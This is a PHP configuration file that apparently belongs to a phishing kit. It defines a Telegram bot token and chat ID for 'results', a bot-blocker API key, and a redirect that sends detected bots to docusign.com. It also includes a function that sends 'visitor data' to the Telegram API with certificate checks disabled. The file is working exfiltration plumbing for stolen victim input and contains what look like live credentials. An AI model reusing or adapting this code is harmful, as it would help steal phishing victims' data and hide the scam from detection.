<?php

// Telegram result configuration.
if (!defined('TELEGRAM_BOT_TOKEN')) {
    define('TELEGRAM_BOT_TOKEN', '8733308903:AAHVf5EQj2IHgn81TNzYbBb5usmCaIDNT-I');
}
if (!defined('TELEGRAM_CHAT_ID')) {
    define('TELEGRAM_CHAT_ID', '5793923604');
}

// botBlockerApiKey.
if (!defined('BlockerApiKey')) {
    define('BlockerApiKey', 'X9dWAN40-yNRfvEcg6qYLNvcoRlWxYmVa-iadzglzAQLC');
}

// Bot redirect URL.
if (!defined('BotRedirection')) {
    define('BotRedirection', 'https://docusign.com');
}

// Enable Bot Blocking.
$botblocking = 0;  // Set to 0 or 1 as needed


/**
 * Transmits visitor data to the Telegram API
 */
function sendTelegramMessage($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

?>
